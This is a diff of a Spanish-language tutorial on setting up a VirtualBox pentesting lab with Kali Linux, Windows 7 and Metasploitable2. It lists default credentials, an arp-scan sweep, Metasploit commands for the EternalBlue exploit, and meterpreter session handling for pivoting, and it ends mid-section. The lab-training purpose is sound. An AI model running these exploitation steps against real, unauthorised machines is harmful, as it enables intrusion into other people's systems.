@@ -60,19 +60,13 @@ Esto asegura que Metasploitable2 estará en la misma red NAT que la máquina Win
    * Selecciona la máquina Kali Linux y abre su configuración en VirtualBox.
    * En la sección **Red**, configura el **Adaptador 1** como un **Adaptador puente**. Esto hará que Kali Linux se conecte directamente a la red física de tu equipo, permitiéndole interactuar con otras máquinas de la misma red local.
 
-Con estas configuraciones, habrás creado un entorno de red adecuado para realizar pruebas de pentesting, donde Windows 7 y Metasploitable2 pueden comunicarse entre sí a través de la red NAT, mientras que Kali Linux tendrá acceso a ambas redes: la interna (NAT) y la red externa (a través del adaptador puente).
-
-## Arranque y Verificación de Máquinas
-
-Sigue estos pasos para arrancar las máquinas y verificar las configuraciones de red.
-
-### 1. Orden de Arranque
+### 5. Orden de Arranque
 
 1. **Kali Linux**: Inicia primero.
 2. **Windows 7**: Luego, enciende la máquina víctima.
 3. **Metasploitable2**: Finalmente, arranca la máquina vulnerable.
 
-### 2. Comprobaciones de Red
+### 6. Comprobaciones de Red
 
 #### Windows 7
 
@@ -91,11 +85,7 @@ Sigue estos pasos para arrancar las máquinas y verificar las configuraciones de
   * **Contraseña**: `msfadmin`
 * Ejecuta `ifconfig` y asegúrate de que solo haya **una interfaz de red** conectada a la red NAT.
 
-Con estos pasos, habrás confirmado que todas las máquinas están configuradas correctamente para tu entorno de pruebas.
-
-#### Infiltración en la Máquina Windows7 y Pivoting
-
-1. **Escaneo de Interfaces de Red con `arp-scan`**
+### 7- Infiltración en la Máquina Windows7 y Pivoting
 
 Para identificar las máquinas en la red local:
 
@@ -103,25 +93,36 @@ Para identificar las máquinas en la red local:
 arp-scan -I eth0 --localnet
 ```
 
-2. **Explotación de la Vulnerabilidad EternalBlue**
+Explotación de la Vulnerabilidad EternalBlue.
 
 ```
 msfconsole
 search eternalblue
 use 0
 show options
+set RHOSTS <IP máquina víctima>
 run
 ```
-
-3. **Verificación de Interfaces de Red para Pivoting**
 
 En meterpreter.
 
 ```bash
-ifconfig
+ipconfig
 ```
 
 Busca una segunda IP en la red NAT en la interfaz 13. Esta podría indicar una red interna para pivoting. Si solo hay una IP, tal vez esta máquina no sea adecuada para pivoting.
 
-4. **Poner en Segundo Plano la Sesión de Meterpreter**
+Poner en Segundo Plano la Sesión de Meterpreter
+
+```
+Ctrl+Z
+```
+
+Para ver las sesiones en segundo plano.
+
+```
+sessions -l
+```
+
+Módulo de metasploit para encontrar equipos de la Red Interna.
 
